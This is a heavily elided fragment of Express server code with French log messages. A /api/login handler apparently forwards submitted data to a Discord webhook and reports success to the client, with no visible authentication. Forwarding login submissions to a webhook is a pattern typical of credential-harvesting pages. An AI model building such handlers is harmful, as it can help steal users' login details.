...
app.post('/api/login', async (req, res) => {
  ...
  try {
    console.log("Tentative d'envoi du webhook vers Discord...");
    ...
    console.log("Réponse de Discord :", discordResponse.status, responseText);

    res.json({ success: true, message: 'Données transmises avec succès' });
  } catch (error) {
    console.error('Erreur critique lors de l\'envoi vers Discord :', error);
